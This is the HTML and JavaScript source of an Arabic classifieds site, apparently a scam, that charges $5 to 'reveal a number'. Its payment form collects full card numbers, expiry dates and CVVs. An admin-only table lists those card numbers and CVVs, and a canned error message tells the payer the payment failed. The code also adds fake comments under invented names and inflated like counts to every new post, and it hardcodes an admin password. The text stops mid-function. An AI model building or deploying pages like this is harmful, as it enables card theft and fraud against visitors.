<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="pageTitle">بنات الاردن بزنس كاش</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <!-- Firebase SDKs (CDN) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
        import { getFirestore, collection, addDoc, onSnapshot, deleteDoc, doc, getDoc, setDoc, getDocs, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyD1jTqkiQvTX1YfVyiA6bH1t9VfHevhKow",
          authDomain: "banatjo2828.firebaseapp.com",
          projectId: "banatjo2828",
          storageBucket: "banatjo2828.firebasestorage.app",
          messagingSenderId: "1051130291618",
          appId: "1:1051130291618:web:537fcea9a403bc02d7befb",
          measurementId: "G-KMYD6YBNJ6"
        };

        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const db = getFirestore(app);

        window.db = db;
        window.collection = collection;
        window.addDoc = addDoc;
        window.onSnapshot = onSnapshot;
        window.deleteDoc = deleteDoc;
        window.doc = doc;
        window.getDoc = getDoc;
        window.setDoc = setDoc;
        window.getDocs = getDocs;
        window.updateDoc = updateDoc;
        window.increment = increment;
    </script>

    <style>
        :root {
            --primary: #6366f1;
            --primary-light: #818cf8;
            --primary-gradient: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            --accent: #f97316;
            --accent-gradient: linear-gradient(135deg, #f97316 0%, #fb923c 100%);
            --success: #10b981;
            --success-gradient: linear-gradient(135deg, #059669 0%, #34d399 100%);
            --bg-color: #0b0f19;
            --card-bg: #131b2e;
            --card-border: rgba(255, 255, 255, 0.07);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #1e293b;
            --danger: #ef4444;
            --radius-lg: 20px;
            --radius-md: 14px;
            --radius-sm: 10px;
        }

        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { 
            background-color: var(--bg-color); 
            background-image: 
                radial-gradient(circle at 10% 10%, rgba(99, 102, 241, 0.12) 0%, transparent 40%),
                radial-gradient(circle at 90% 90%, rgba(168, 85, 247, 0.08) 0%, transparent 40%);
            margin: 0; 
            padding: 20px 16px; 
            color: var(--text-main); 
            min-height: 100vh;
        }

        .container { max-width: 480px; margin: 0 auto; padding-bottom: 40px; }
        
        /* Notice Banner */
        .notice-banner {
            background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.2));
            border: 1px solid rgba(245, 158, 11, 0.3);
            color: #fbbf24;
            padding: 14px 18px;
            border-radius: var(--radius-md);
            margin-bottom: 20px;
            font-size: 13px;
            font-weight: 700;
            display: none;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.1);
            animation: slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            line-height: 1.5;
        }
        .notice-icon { font-size: 20px; flex-shrink: 0; }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Header */
        header { 
            text-align: center; 
            margin-bottom: 20px; 
            padding: 24px 20px;
            background: rgba(19, 27, 46, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--card-border);
            border-radius: var(--radius-lg);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }

        header h1 { 
            color: #ffffff; 
            font-size: 24px; 
            margin: 0 0 16px 0; 
            font-weight: 900;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #ffffff 30%, #a5b4fc 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Main Action Button (Open Create Post Modal) */
        .btn-open-create {
            background: var(--primary-gradient);
            color: white;
            width: 100%;
            padding: 13px;
            border-radius: var(--radius-md);
            font-size: 14px;
            font-weight: 800;
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.35);
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 25px;
            transition: transform 0.2s ease;
        }
        .btn-open-create:active { transform: scale(0.98); }

        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 12px; color: var(--text-muted); }
        
        .form-group input, .form-group textarea, .form-group select { 
            width: 100%; 
            padding: 11px 14px; 
            border: 1px solid var(--border-color); 
            border-radius: var(--radius-sm); 
            font-size: 13px; 
            background-color: #0b0f19; 
            color: white;
            outline: none; 
            transition: all 0.2s ease;
        }
        
        .form-group input:focus, .form-group textarea:focus, .form-group select:focus { 
            border-color: var(--primary); 
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.25); 
        }

        .form-group input[type="file"] {
            padding: 8px;
            background: #0b0f19;
            cursor: pointer;
            color: var(--text-muted);
        }
        
        button { cursor: pointer; border: none; font-weight: 700; border-radius: var(--radius-sm); font-family: 'Cairo', sans-serif; }
        
        .btn-add { 
            background: var(--primary-gradient); 
            color: white; 
            width: 100%; 
            padding: 12px; 
            font-size: 13px; 
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.35);
            transition: all 0.2s ease;
        }
        .btn-add:hover { opacity: 0.95; transform: translateY(-1px); }
        .btn-add:active { transform: scale(0.98); }

        /* Admin Section */
        .admin-section { 
            display: none; 
            background: var(--card-bg); 
            padding: 22px; 
            border-radius: var(--radius-lg); 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            margin-bottom: 25px; 
            border: 1px solid rgba(99, 102, 241, 0.3);
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .admin-section h3 { 
            margin-top: 0; 
            font-size: 16px; 
            color: #f1f5f9; 
            margin-bottom: 16px; 
            font-weight: 700; 
            border-right: 4px solid var(--primary); 
            padding-right: 10px; 
        }

        .settings-box { 
            background: rgba(11, 15, 25, 0.5); 
            padding: 14px; 
            border-radius: var(--radius-md); 
            margin-bottom: 16px; 
            border: 1px solid var(--border-color); 
        }
        
        /* Listings Grid */
        .listings-grid { 
            display: grid; 
            grid-template-columns: repeat(2, 1fr); 
            gap: 14px; 
        }
        
        .post-card { 
            background: var(--card-bg); 
            border-radius: var(--radius-md); 
            overflow: hidden; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.25); 
            border: 1px solid var(--card-border); 
            transition: transform 0.25s ease, box-shadow 0.25s ease;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            cursor: pointer;
        }
        .post-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.4);
            border-color: rgba(99, 102, 241, 0.2);
        }
        
        .post-img-container { position: relative; width: 100%; height: 130px; background: #0b0f19; overflow: hidden; }
        .post-img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.4s ease; }
        .post-card:hover .post-img { transform: scale(1.06); }
        
        .post-body { padding: 12px; display: flex; flex-direction: column; flex-grow: 1; }
        
        .post-desc { font-size: 12px; color: #f8fafc; margin-bottom: 10px; line-height: 1.45; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; flex-grow: 1; }
        
        .post-actions-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-top: 6px;
            border-top: 1px solid rgba(255,255,255,0.05);
        }

        .post-like-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-muted);
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            transition: all 0.2s;
        }
        .post-like-btn.liked {
            background: rgba(239, 68, 68, 0.15);
            color: #f87171;
            border-color: rgba(239, 68, 68, 0.3);
        }

        .btn-unlock { 
            background: var(--accent-gradient); 
            color: white; 
            width: 100%; 
            padding: 8px 6px; 
            border-radius: 8px; 
            font-size: 11px; 
            text-align: center; 
            display: block; 
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3); 
            font-weight: 700;
            border: none;
            margin-top: auto;
        }
        
        .btn-delete { 
            background: rgba(239, 68, 68, 0.12); 
            color: #f87171; 
            border: 1px solid rgba(239, 68, 68, 0.25);
            margin-top: 6px; 
            width: 100%; 
            padding: 6px; 
            font-size: 11px; 
            border-radius: 6px;
            font-weight: 600;
        }

        .empty-state { text-align: center; color: var(--text-muted); padding: 50px 20px; font-size: 13px; grid-column: span 2; font-weight: 500; }

        /* Modals Shared */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(5, 7, 12, 0.88);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 16px;
            animation: fadeIn 0.2s ease;
        }

        .modal-box {
            background: var(--card-bg);
            color: var(--text-main);
            width: 100%;
            max-width: 450px;
            max-height: 88vh;
            overflow-y: auto;
            padding: 20px;
            border-radius: var(--radius-lg);
            border: 1px solid var(--card-border);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            position: relative;
        }

        /* Back / Close Button */
        .btn-back {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-muted);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            float: left;
            font-weight: bold;
            font-size: 11px;
            display: flex;
            align-items: center;
            gap: 4px;
            transition: all 0.2s;
        }
        .btn-back:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        /* Comments Section */
        .comments-section {
            margin-top: 20px;
            border-top: 1px solid var(--border-color);
            padding-top: 15px;
        }
        .comment-item {
            background: rgba(11, 15, 25, 0.6);
            border: 1px solid var(--border-color);
            padding: 10px 12px;
            border-radius: var(--radius-sm);
            margin-bottom: 10px;
            font-size: 12px;
        }
        .comment-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }
        .comment-author { font-weight: 700; color: #a5b4fc; display: flex; align-items: center; gap: 4px; }
        .comment-author.admin-badge-name { color: #38bdf8; }
        .verified-badge {
            background: #38bdf8;
            color: #0b0f19;
            border-radius: 50%;
            width: 13px;
            height: 13px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            font-weight: 900;
        }
        .comment-text { color: #cbd5e1; margin-bottom: 6px; word-break: break-word; }
        .comment-like-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-muted);
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 11px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            transition: all 0.2s;
        }
        .comment-like-btn.liked {
            background: rgba(239, 68, 68, 0.15);
            color: #f87171;
            border-color: rgba(239, 68, 68, 0.3);
        }

        /* Payment Modal Specific */
        .payment-card-modal {
            background: #ffffff;
            color: #0f172a;
            padding: 24px;
            border-radius: 24px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
            width: 100%;
            max-width: 400px;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
        }

        /* Admin Attempts Panel */
        .admin-attempts-container {
            background: #ffffff;
            color: #0f172a;
            width: 100%;
            max-width: 750px;
            max-height: 85vh;
            overflow-y: auto;
            padding: 24px;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
            text-align: right;
        }

        /* Subtle Admin Link at Bottom */
        .subtle-admin-footer {
            text-align: center;
            margin-top: 40px;
            padding-bottom: 20px;
        }
        .subtle-admin-link {
            color: rgba(148, 163, 184, 0.3);
            font-size: 10px;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.2s;
            user-select: none;
        }
        .subtle-admin-link:hover {
            color: var(--text-muted);
        }
    </style>
</head>
<body>

<div class="container">
    <div id="siteNoticeBanner" class="notice-banner">
        <span class="notice-icon">📢</span>
        <span id="siteNoticeText"></span>
    </div>

    <header>
        <h1 id="siteTitleDisplay">بنات الاردن بزنس كاش</h1>
    </header>

    <!-- Button to open Create Post Modal -->
    <button class="btn-open-create" onclick="openCreatePostModal()">
        نشر منشور
    </button>

    <!-- Admin Panel (Hidden until logged in) -->
    <div id="adminPanel" class="admin-section">
        <h3>لوحة التحكم والإدارة والموافقة</h3>
        
        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>نشر ملاحظة / تنبيه أعلى الموقع:</label>
                <textarea id="noticeInput" placeholder="اكتب ملاحظة أو تنبيه هام يظهر أعلى الموقع للزوار..."></textarea>
            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); padding: 10px; font-size: 12px;" onclick="updateNotice()">حفظ ونشر الملاحظة</button>
            <button class="btn-add" style="background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); padding: 8px; font-size: 11px; margin-top: 6px;" onclick="clearNotice()">إلغاء وإخفاء الملاحظة</button>
        </div>

        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>تعديل اسم الموقع:</label>
                <input type="text" id="newSiteTitleInput" placeholder="أدخل اسم الموقع الجديد">
            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); padding: 10px; font-size: 12px;" onclick="updateSiteTitle()">حفظ الاسم الجديد</button>
        </div>

        <button class="btn-add" style="background: #10b981; margin-bottom: 12px; font-size: 12px;" onclick="openAttemptsModal()">📋 عرض سجل محاولات الدفع</button>

        <h4 style="color: #f1f5f9; font-size: 14px; margin-bottom: 10px; border-bottom: 1px solid var(--border-color); padding-bottom: 6px;">المنشورات بانتظار الموافقة</h4>
        <div id="pendingList" style="display: flex; flex-direction: column; gap: 10px;"></div>
    </div>

    <!-- Approved Listings Grid -->
    <div id="listings" class="listings-grid"></div>

    <!-- Subtle Admin Link at Bottom -->
    <div class="subtle-admin-footer">
        <span class="subtle-admin-link" onclick="loginAdmin()">إدارة الموقع</span>
    </div>
</div>

<!-- Create Post Modal -->
<div id="createPostModal" class="modal-overlay">
    <div class="modal-box">
        <button class="btn-back" onclick="goBack()">⬅ رجوع</button>
        <div style="clear: both; height: 12px;"></div>
        <h3 style="margin-top: 0; font-size: 16px; color: #fff; margin-bottom: 14px;">نشر منشور</h3>
        
        <div class="form-group">
            <label>المنشور:</label>
            <textarea id="pDesc" placeholder="اكتب المنشور..." required style="height: 100px;"></textarea>
        </div>
        <div class="form-group">
            <label>الصورة اختياري</label>
            <input type="file" id="pImage" accept="image/*">
        </div>
        
        <button class="btn-add" onclick="submitNewPost()">نشر المنشور</button>
    </div>
</div>

<!-- Post Detail / Comments Modal -->
<div id="postDetailModal" class="modal-overlay">
    <div class="modal-box">
        <button class="btn-back" onclick="goBack()">⬅ رجوع</button>
        <div style="clear: both; height: 12px;"></div>
        
        <div id="modalPostContent"></div>

        <div class="comments-section">
            <h4 style="font-size: 13px; margin: 0 0 10px 0; color: #f1f5f9;">التعليقات</h4>
            <div id="commentsList" style="max-height: 200px; overflow-y: auto; margin-bottom: 12px;"></div>
            
            <div id="commentFormContainer" style="background: rgba(11, 15, 25, 0.4); padding: 10px; border-radius: var(--radius-sm); border: 1px solid var(--border-color);">
                <div class="form-group" id="authorInputGroup" style="margin-bottom: 8px;">
                    <label id="authorLabel">الاسم (إلزامي):</label>
                    <input type="text" id="commentAuthor" placeholder="ادخل اسمك..." style="padding: 8px 10px; font-size: 12px;">
                </div>
                <div class="form-group" style="margin-bottom: 8px;">
                    <textarea id="commentText" placeholder="اكتب تعليقك..." style="padding: 8px 10px; font-size: 12px; height: 50px;"></textarea>
                </div>
                <button class="btn-add" style="padding: 8px; font-size: 12px;" onclick="submitComment()">إرسال التعليق</button>
            </div>
        </div>
    </div>
</div>

<!-- Payment Modal -->
<div id="paymentModal" class="modal-overlay">
    <div class="payment-card-modal">
        <button class="btn-back" style="background: #fee2e2; color: #dc2626; border-color: #fecaca;" onclick="goBack()">⬅ رجوع</button>
        <div style="clear: both; height: 12px;"></div>
        
        <div style="text-align: center; margin-bottom: 16px;">
            <h2 style="color: #0f172a; font-size: 17px; margin: 0 0 6px 0; font-weight: 800;">إتمام عملية الدفع</h2>
            <p style="color: #f97316; font-size: 12px; font-weight: 700; margin: 0; background: #fff7ed; padding: 5px 10px; border-radius: 8px; display: inline-block; border: 1px solid #ffedd5;">طلب إظهار الرقم (5$)</p>
        </div>
        
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardType" style="color: #334155; font-weight: 700;">نوع البطاقة</label>
                <select id="cardType" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
                    <option value="" disabled selected>اختر طريقة الدفع</option>
                    <option value="Visa">فيزا (Visa)</option>
                    <option value="MasterCard">ماستر كارد (MasterCard)</option>
                </select>
            </div>

            <div class="form-group">
                <label for="cardHolder" style="color: #334155; font-weight: 700;">اسم صاحب البطاقة</label>
                <input type="text" id="cardHolder" placeholder="الاسم الكامل" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
            </div>

            <div class="form-group">
                <label for="cardNumber" style="color: #334155; font-weight: 700;">رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
            </div>

            <div style="display: flex; gap: 8px;">
                <div class="form-group" style="flex: 1;">
                    <label for="expiryMonth" style="color: #334155; font-weight: 700;">الشهر</label>
                    <select id="expiryMonth" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
                        <option value="" disabled selected>الشهر</option>
                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                    </select>
                </div>

                <div class="form-group" style="flex: 1;">
                    <label for="expiryYear" style="color: #334155; font-weight: 700;">السنة</label>
                    <select id="expiryYear" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
                        <option value="" disabled selected>السنة</option>
                        <option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label for="cvv" style="color: #334155; font-weight: 700;">CVV</label>
                <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required style="background-color: #f8fafc; color: #0f172a; border-color: #cbd5e1;">
            </div>

            <button type="submit" style="background: linear-gradient(135deg, #f97316 0%, #ea580c 100%); color: white; border: none; width: 100%; padding: 12px; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 6px;">إتمام الدفع</button>
            <div id="error-msg" style="color: #dc2626; margin-top: 10px; font-weight: bold; font-size: 11px; text-align: center; display: none;">حدث خطأ أثناء معالجة الدفع، يرجى المحاولة لاحقاً.</div>
        </form>
    </div>
</div>

<!-- Admin Attempts Modal -->
<div id="adminAttemptsModal" class="modal-overlay">
    <div class="admin-attempts-container">
        <button class="btn-back" style="background: #fee2e2; color: #dc2626; border-color: #fecaca;" onclick="goBack()">⬅ رجوع</button>
        <div style="clear: both; height: 12px;"></div>
        <h3 style="color: #0f172a; margin-top: 0; font-size: 17px; font-weight: 800;">سجل محاولات الدفع</h3>
        <div style="width: 100%; overflow-x: auto; margin-top: 14px;">
            <table style="width: 100%; border-collapse: collapse; white-space: nowrap;">
                <thead>
                    <tr>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">الوقت</th>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">النوع</th>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">الاسم</th>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">رقم البطاقة</th>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">التاريخ</th>
                        <th style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px; background-color: #f8fafc; color: #334155; font-weight: 700;">CVV</th>
                    </tr>
                </thead>
                <tbody id="attempts-list"></tbody>
            </table>
        </div>
    </div>
</div>

<script>
    let posts = [];
    let isAdmin = false;
    let activePostId = null;

    function initSiteSettings() {
        window.onSnapshot(window.doc(window.db, "settings", "config"), (docSnap) => {
            if (docSnap.exists()) {
                const data = docSnap.data();
                const savedTitle = data.title || "بنات الاردن بزنس كاش";
                document.title = savedTitle;
                const siteTitleDisplay = document.getElementById('siteTitleDisplay');
                if (siteTitleDisplay) siteTitleDisplay.innerText = savedTitle;
                const newSiteTitleInput = document.getElementById('newSiteTitleInput');
                if (newSiteTitleInput) newSiteTitleInput.value = savedTitle;

                const savedNotice = data.notice || "";
                const noticeBanner = document.getElementById('siteNoticeBanner');
                const noticeText = document.getElementById('siteNoticeText');
                const noticeInput = document.getElementById('noticeInput');
                
                if (noticeInput) noticeInput.value = savedNotice;

                if (savedNotice.trim() !== "") {
                    noticeText.innerText = savedNotice;
                    noticeBanner.style.display = 'flex';
                } else {
                    noticeBanner.style.display = 'none';
                }
            }
        });
    }

    function updateAdminCommentUI() {
        const authorGroup = document.getElementById('authorInputGroup');
        const commentFormContainer = document.getElementById('commentFormContainer');
        
        if (isAdmin) {
            authorGroup.style.display = 'none';
            if (commentFormContainer) {
                commentFormContainer.style.display = 'block';
            }
        } else {
            authorGroup.style.display = 'block';
            if (activePostId && localStorage.getItem(`commented_post_${activePostId}`) === 'true') {
                commentFormContainer.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:12px; padding: 10px;">لقد قمت بإضافة تعليق مسبقاً على هذا المنشور.</div>';
            }
        }
    }

    async function updateSiteTitle() {
        const newTitle = document.getElementById('newSiteTitleInput').value.trim();
        if (newTitle) {
            try {
                await window.setDoc(window.doc(window.db, "settings", "config"), { title: newTitle }, { merge: true });
                alert("تم تحديث اسم الموقع بنجاح!");
            } catch (error) { alert("حدث خطأ أثناء الحفظ."); }
        }
    }

    async function updateNotice() {
        const noticeTextVal = document.getElementById('noticeInput').value.trim();
        try {
            await window.setDoc(window.doc(window.db, "settings", "config"), { notice: noticeTextVal }, { merge: true });
            alert("تم نشر الملاحظة بنجاح!");
        } catch (error) { alert("حدث خطأ أثناء الحفظ."); }
    }

    async function clearNotice() {
        try {
            await window.setDoc(window.doc(window.db, "settings", "config"), { notice: "" }, { merge: true });
            document.getElementById('noticeInput').value = '';
            alert("تم إزالة الملاحظة بنجاح!");
        } catch (error) { alert("حدث خطأ أثناء الحذف."); }
    }

    function loginAdmin() {
        if (!isAdmin) {
            let pass = prompt("الرجاء إدخال كلمة سر الأدمن:");
            if (pass === "@oday1996oday@") {
                isAdmin = true;
                document.getElementById('adminPanel').style.display = 'block';
                updateAdminCommentUI();
                alert("تم تسجيل الدخول للأدمن بنجاح!");
                renderPosts();
            } else if (pass !== null) {
                alert("كلمة السر غير صحيحة");
            }
        } else {
            document.getElementById('adminPanel').style.display = 'block';
        }
    }

    // Modal Controls with History Support
    function openModal(modalId) {
        window.history.pushState({ modal: modalId }, "");
        document.getElementById(modalId).style.display = 'flex';
    }

    function goBack() {
        window.history.back();
    }

    window.addEventListener('popstate', (event) => {
        document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
        activePostId = null;
    });

    function openCreatePostModal() {
        openModal('createPostModal');
    }

    function submitNewPost() {
        const desc = document.getElementById('pDesc').value.trim();
        const fileInput = document.getElementById('pImage');

        if (!desc) {
            alert("يرجى كتابة نص المنشور!");
            return;
        }

        const savePostData = async (imgUrl = "") => {
            try {
                const isApprovedDirectly = isAdmin;

                const docRef = await window.addDoc(window.collection(window.db, "posts"), {
                    desc: desc,
                    image: imgUrl,
                    approved: isApprovedDirectly,
                    likes: Math.floor(Math.random() * 15) + 12,
                    createdAt: Date.now()
                });

                const postId = docRef.id;
                await window.addDoc(window.collection(window.db, "posts", postId, "comments"), {
                    author: "ريما أحمد",
                    text: "تم التواصل معك، كيف أقدر أحكي معك؟",
                    isAdminComment: false,
                    likes: 4,
                    createdAt: Date.now() - 3600000
                });
                await window.addDoc(window.collection(window.db, "posts", postId, "comments"), {
                    author: "فاطمة العبدالله",
                    text: "منشور رائع، بالتوفيق إن شاء الله",
                    isAdminComment: false,
                    likes: 2,
                    createdAt: Date.now() - 1800000
                });
                
                document.getElementById('pDesc').value = '';
                document.getElementById('pImage').value = '';
                goBack();

                if (isAdmin) {
                    alert("تم نشر المنشور مع التعليقات واللايكات الافتراضية بنجاح فوراً!");
                } else {
                    alert("تم إرسال المنشور بنجاح! سيظهر في الموقع بعد موافقة الأدمن.");
                }
            } catch (error) {
                alert("حدث خطأ أثناء النشر.");
            }
        };

        if (fileInput.files.length > 0) {
            const reader = new FileReader();
            reader.onload = function(e) {
                savePostData(e.target.result);
            };
            reader.readAsDataURL(fileInput.files[0]);
        } else {
            savePostData("");
        }
    }

    async function approvePost(id) {
        try {
            await window.updateDoc(window.doc(window.db, "posts", id), { approved: true });
            alert("تمت الموافقة على المنشور ونشره للمستخدمين بنجاح!");
        } catch (error) {
            alert("حدث خطأ أثناء الموافقة.");
        }
    }

    async function deletePost(id) {
        if(confirm("هل أنت متأكد من حذف هذا المنشور نهائياً؟")) {
            try {
                await window.deleteDoc(window.doc(window.db, "posts", id));
                alert("تم الحذف بنجاح!");
            } catch (error) { alert("حدث خطأ أثناء الحذف."); }
        }
    }

    async function togglePostLike(postId) {
        const likedKey = `liked_post_${postId}`;
        const isLiked = localStorage.getItem(likedKey) === 'true';
        const postRef = window.doc(window.db, "posts", postId);

        try {
            if (isLiked) {
                await window.updateDoc(postRef, { likes: window.increment(-1) });
                localStorage.removeItem(likedKey);
            } else {
                await window.updateDoc(postRef, { likes: window.increment(1) });
                localStorage.setItem(likedKey, 'true');
            }
        } catch (error) {
            console.error("Error liking post", error);
        }
    }

    function openPostDetail(postId) {
        activePostId = postId;
        const post = posts.find(p => p.id === postId);
        if (!post) return;

        let modalContent = `
            ${post.image ? `<div style="width:100%; height:200px; border-radius:12px; overflow:hidden; margin-bottom:12px; background:#000;"><img src="${post.image}" style="width:100%; height:100%; object-fit:cover;"></div>` : ''}
            <p style="color:#fff; font-size:13px; line-height:1.6; margin-bottom:16px; word-break: break-word;">${post.desc || ''}</p>
            <button onclick="openPaymentModal()" class="btn-unlock" style="padding:10px; font-size:12px;">📞 إظهار الرقم (5$)</button>
        `;
        document.getElementById('modalPostContent').innerHTML = modalContent;
        
        // Reset comment container HTML structure if not already commented
        const commentFormContainer = document.getElementById('commentFormContainer');
        if (!isAdmin && localStorage.getItem(`commented_post_${postId}`) === 'true') {
            commentFormContainer.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:12px; padding: 10px;">لقد قمت بإضافة تعليق مسبقاً على هذا المنشور.</div>';
        } else {
            commentFormContainer.innerHTML = `
                <div class="form-group" id="authorInputGroup" style="margin-bottom: 8px;">
                    <label id="authorLabel">الاسم (إلزامي):</label>
                    <input type="text" id="commentAuthor" placeholder="ادخل اسمك..." style="padding: 8px 10px; font-size: 12px;">
                </div>
                <div class="form-group" style="margin-bottom: 8px;">
                    <textarea id="commentText" placeholder="اكتب تعليقك..." style="padding: 8px 10px; font-size: 12px; height: 50px;"></textarea>
                </div>
                <button class="btn-add" style="padding: 8px; font-size: 12px;" onclick="submitComment()">إرسال التعليق</button>
            `;
        }

        updateAdminCommentUI();
        openModal('postDetailModal');
        loadComments(postId);
    }

    async function submitComment() {
        let author = "";
        let isAdm = false;

        if (isAdmin) {
            author = "ادمن";
            isAdm = true;
        } else {
            const commentKey = `commented_post_${activePostId}`;
            if (localStorage.getItem(commentKey) === 'true') {
                alert("عذراً، يمكنك إضافة تعليق واحد فقط لكل منشور.");
                return;
            }

            author = document.getElementById('commentAuthor').value.trim();
            if (!author) {
                alert("يرجى إدخال الاسم (إلزامي)!");
                return;
            }
        }

        const text = document.getElementById('commentText').value.trim();
        if (!text) {
            alert("يرجى كتابة نص التعليق!");
            return;
        }

        try {
            await window.addDoc(window.collection(window.db, "posts", activePostId, "comments"), {
                author,
                text,
                isAdminComment: isAdm,
                likes: 0,
                createdAt: Date.now()
            });

            if (!isAdmin) {
                localStorage.setItem(`commented_post_${activePostId}`, 'true');
                const commentFormContainer = document.getElementById('commentFormContainer');
                if (commentFormContainer) {
                    commentFormContainer.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:12px; padding: 10px;">لقد قمت بإضافة تعليق مسبقاً على هذا المنشور.</div>';
                }
            } else {
                document.getElementById('commentText').value = '';
            }
        } catch (error) {
            alert("حدث خطأ أثناء إرسال التعليق.");
        }
    }

    function loadComments(postId) {
        const commentsListDiv = document.getElementById('commentsList');
        commentsListDiv.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:12px;">جاري تحميل التعليقات...</div>';

        window.onSnapshot(window.collection(window.db, "posts", postId, "comments"), (snapshot) => {
            commentsListDiv.innerHTML = '';
